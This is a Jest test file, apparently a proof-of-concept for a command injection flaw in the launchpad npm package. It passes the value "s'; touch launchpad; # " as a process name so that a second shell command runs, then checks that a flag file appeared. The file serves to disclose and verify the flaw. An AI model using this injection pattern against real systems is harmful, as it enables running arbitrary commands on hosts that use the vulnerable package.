//https://github.com/bitovi/launchpad/pull/124
test("Command Injection in launchpad", (done) => {
  const path = require("path");
  const fs = require("fs");
  const launchpad = require(path.resolve(
    __dirname,
    "../node_modules/launchpad/lib/local/instance"
  ));
  const pathToFlag = path.resolve(__dirname, "./launchpad");
  try {
    if (fs.existsSync(pathToFlag)) {
      fs.unlinkSync(pathToFlag);
      console.log("File removed:", pathToFlag);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(pathToFlag);
  expect(file_exist).toBe(false);

  let tst = new launchpad.Instance(
    "echo",
    {},
    {},
    { process: "s'; touch launchpad; # " }
  );
  tst.getPid(() => {
    file_exist = fs.existsSync(pathToFlag);
    expect(file_exist).toBe(true);
    fs.unlink(pathToFlag, function () {});
    done();
  });
});
